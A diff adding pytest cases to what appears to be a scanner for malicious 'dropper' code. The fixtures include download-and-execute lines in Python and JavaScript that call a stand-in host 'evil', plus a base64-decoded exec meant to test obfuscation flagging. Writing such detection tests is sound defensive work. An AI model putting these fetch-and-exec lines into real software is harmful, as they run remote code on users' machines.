@@ -86,6 +86,35 @@ def test_wrapped_function_dropper(tmp_path, name, src):
     assert "BP-DROPPER" in comps
 
 
+@pytest.mark.parametrize("name,src", [
+    # the download is INLINE in the sink's args — no variable, no helper
+    ("d.py", 'import urllib.request\nexec(urllib.request.urlopen("http://evil/p").read().decode())\n'),
+    ("d.js", 'eval(fetch("http://evil/p"));\n'),
+])
+def test_inline_fetch_direct_dropper(tmp_path, name, src):
+    comps, _ = _comps(tmp_path, name, src)
+    assert "BP-DROPPER" in comps
+
+
+def test_inline_does_not_duplicate_wrapped_path(tmp_path):
+    # exec(fetch(u)) with fetch a helper: the wrapped-fn proof already covers it, so the
+    # inline check must not add a second dataflow path for the same call.
+    (tmp_path / "w.py").write_text(
+        'import urllib.request\ndef fetch(u):\n    return urllib.request.urlopen(u).read()\nexec(fetch("http://evil/p"))\n')
+    obs, inv = observe(str(tmp_path))
+    dropper_paths = [e for e in inv.dataflow.get("w.py", []) if e.get("kind") == "dropper"]
+    assert len(dropper_paths) == 1
+
+
+def test_inline_decode_stays_cooccurrence_not_new_proof(tmp_path):
+    # decode-inline (eval(atob(x))) is deliberately NOT promoted to a proven dropper path
+    # (parity with the frozen oracle) — it is still flagged via BP-OBFEXEC co-occurrence.
+    (tmp_path / "o.py").write_text('import base64\nexec(base64.b64decode("ZWNobyBoaQ=="))\n')
+    obs, inv = observe(str(tmp_path))
+    assert not [e for e in inv.dataflow.get("o.py", []) if e.get("kind") == "dropper"]
+    assert "BP-OBFEXEC" in {f.get("composition") for f in compose_mcd(obs, inv)}
+
+
 def test_wrapped_helper_returning_data_is_not_a_dropper(tmp_path):
     # A helper that fetches but whose result is used as DATA (not exec) is not a dropper.
     comps, _ = _comps(
